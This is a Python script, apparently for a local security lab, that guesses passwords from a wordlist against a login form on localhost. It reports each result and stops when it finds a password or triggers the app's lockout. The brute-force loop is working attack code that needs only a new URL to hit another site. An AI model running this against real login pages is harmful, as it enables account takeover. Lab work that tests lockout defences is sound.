"""
attack.py — Credential Stuffing Attack Simulator
=================================================
Simulates an attacker trying passwords from a wordlist against the login endpoint.

Usage:
    python attack.py

Requirements:
    pip install requests

Wordlist: uses small.txt by default (subset of rockyou.txt)
The script detects:
  - A successful login (redirect to /2fa)
  - A lockout response (flash message about account locked)
"""

import requests
import sys
import time

TARGET_URL = "http://127.0.0.1:5000/"
WORDLIST    = "small.txt"          # change to "rockyou.txt" for full attack

def load_wordlist(path: str) -> list[str]:
    try:
        with open(path, encoding="latin-1") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[ERROR] Wordlist not found: {path}")
        sys.exit(1)

def attack(username: str, passwords: list[str]):
    print(f"\n{'='*60}")
    print(f"  CREDENTIAL STUFFING ATTACK")
    print(f"  Target  : {TARGET_URL}")
    print(f"  Username: {username}")
    print(f"  Wordlist: {WORDLIST} ({len(passwords)} passwords)")
    print(f"{'='*60}\n")

    session = requests.Session()
    success_count = 0
    locked_count  = 0
    attempt       = 0

    for pwd in passwords:
        attempt += 1
        try:
            r = session.post(
                TARGET_URL,
                data={"username": username, "password": pwd},
                allow_redirects=False,
                timeout=5
            )
        except requests.exceptions.ConnectionError:
            print("[ERROR] Cannot connect. Is app.py running?")
            sys.exit(1)

        location = r.headers.get("Location", "")
        body     = r.text.lower()

        # ── Detect lockout (rate limiting kicked in) ──
        if "account locked" in body or "locked" in body:
            locked_count += 1
            print(f"[#{attempt:4d}] {pwd:<20s} → 🔒 LOCKED (rate limiting blocked us!)")
            print(f"\n  Attack stopped. {locked_count} lockout(s) triggered.")
            print(f"  Accounts actually compromised: {success_count}")
            break

        # ── Detect successful login ──
        if location == "/2fa" or r.status_code == 302 and "2fa" in location:
            success_count += 1
            print(f"[#{attempt:4d}] {pwd:<20s} → ✅ PASSWORD FOUND!")
            print(f"\n  {'='*40}")
            print(f"  CREDENTIAL FOUND: {username} / {pwd}")
            print(f"  (Attacker would now proceed to 2FA)")
            print(f"  {'='*40}\n")
            break

        # ── Regular failure ──
        print(f"[#{attempt:4d}] {pwd:<20s} → ✗  Wrong password ({r.status_code})")

    else:
        print(f"\n  Wordlist exhausted. {success_count} account(s) compromised.")

    print(f"\nSummary: {attempt} attempts | {success_count} success | {locked_count} lockouts")

if __name__ == "__main__":
    username = input("Enter target username: ").strip()
    if not username:
        print("No username provided.")
        sys.exit(1)

    passwords = load_wordlist(WORDLIST)
    attack(username, passwords)
